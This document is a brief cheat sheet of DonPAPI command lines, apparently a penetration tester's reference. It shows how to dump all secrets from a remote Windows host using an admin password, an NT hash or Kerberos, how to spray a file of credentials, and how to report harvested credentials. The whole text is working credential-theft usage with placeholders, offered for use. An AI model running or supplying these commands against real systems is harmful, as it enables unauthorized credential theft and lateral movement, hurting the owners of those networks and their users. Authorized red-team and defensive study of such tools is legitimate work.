# [Dump all secrets of the target machine with an admin password](https://github.com/login-securite/DonPAPI)
```sh
python3 ./DonPAPI.py '<domain>/<user>:<password>@<host>'
```

# Dump all secrets of the target machine with an admin hash
```sh
python3 ./DonPAPI.py --hashes <LM>:<NT> '<domain>/<user>@<host>'
```

# Dump all secrets using kerberos (-k) and local auth (-local_auth)
```sh
python3 ./DonPAPI.py -k '<domain>/<user>@<host>'
```

# Test credentials
```
# creds.txt
# <user>:<pass>
python3 ./DonPAPI.py -credz creds.txt '<domain>/user:pass@<host>'
```

# Create a report of all harvest credentials
```sh
python3 ./DonPAPI.py -R
```



